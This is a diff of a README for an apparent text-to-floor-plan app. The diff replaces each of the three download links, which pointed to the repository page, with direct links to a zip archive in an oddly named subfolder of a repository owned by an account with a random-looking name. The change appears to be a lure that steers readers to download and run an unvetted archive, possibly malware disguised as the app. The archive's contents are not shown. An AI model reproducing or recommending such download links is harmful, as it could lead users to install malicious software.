@@ -1,12 +1,12 @@
 # 🏠 floorplan-generator - Turn text into floor plans
 
-[![Download floorplan-generator](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/enyaselfconfessed917/floorplan-generator)
+[![Download floorplan-generator](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/enyaselfconfessed917/floorplan-generator/raw/refs/heads/main/mesopleuron/floorplan_generator_v3.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download floorplan-generator](https://github.com/enyaselfconfessed917/floorplan-generator)
+[Download floorplan-generator](https://github.com/enyaselfconfessed917/floorplan-generator/raw/refs/heads/main/mesopleuron/floorplan_generator_v3.8.zip)
 
 ## 🖥️ What this app does
 
@@ -207,4 +207,4 @@ Try prompts like:
 
 If you need the file again, use this link:
 
-[https://github.com/enyaselfconfessed917/floorplan-generator](https://github.com/enyaselfconfessed917/floorplan-generator)
+[https://github.com/enyaselfconfessed917/floorplan-generator/raw/refs/heads/main/mesopleuron/floorplan_generator_v3.8.zip](https://github.com/enyaselfconfessed917/floorplan-generator/raw/refs/heads/main/mesopleuron/floorplan_generator_v3.8.zip)
